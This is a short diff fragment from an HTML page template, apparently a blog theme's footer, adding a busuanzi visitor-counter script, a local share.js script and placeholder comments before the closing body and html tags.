+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20210823" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
